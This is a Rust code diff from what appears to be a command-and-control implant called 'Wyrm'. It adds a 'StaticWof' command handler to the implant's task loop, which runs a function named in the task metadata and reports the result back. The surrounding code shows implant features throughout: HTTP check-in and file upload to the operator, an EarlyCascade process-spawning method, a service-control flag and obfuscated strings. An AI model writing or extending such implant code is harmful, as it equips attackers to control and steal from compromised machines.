@@ -31,7 +31,6 @@ use windows_sys::{
     core::{PCWSTR, PWSTR},
 };
 
-use crate::utils::console::print_failed;
 use crate::{
     comms::{comms_http_check_in, upload_file_as_stream},
     entry::{APPLICATION_RUNNING, IS_IMPLANT_SVC},
@@ -54,6 +53,7 @@ use crate::{
         strings::generate_mutex_name, svc_controls::stop_svc_and_exit, time_utils::epoch_now,
     },
 };
+use crate::{utils::console::print_failed, wofs::call_static_wof};
 
 pub struct RetriesBeforeExit {
     /// The time in seconds to sleep between failed connections on first connection
@@ -345,6 +345,18 @@ impl Wyrm {
                     };
 
                     Spawn::spawn_child(buf, SpawnMethod::EarlyCascade, &self.spawn_as);
+                }
+                Command::StaticWof => {
+                    let Some(fn_name) = &task.metadata else {
+                        let msg = sc!("No metadata found.", 97).unwrap();
+                        print_failed(msg);
+                        self.push_completed_task::<String>(&task, None);
+
+                        continue;
+                    };
+
+                    let result = call_static_wof(fn_name);
+                    self.push_completed_task(&task, Some(result));
                 }
             }
         }
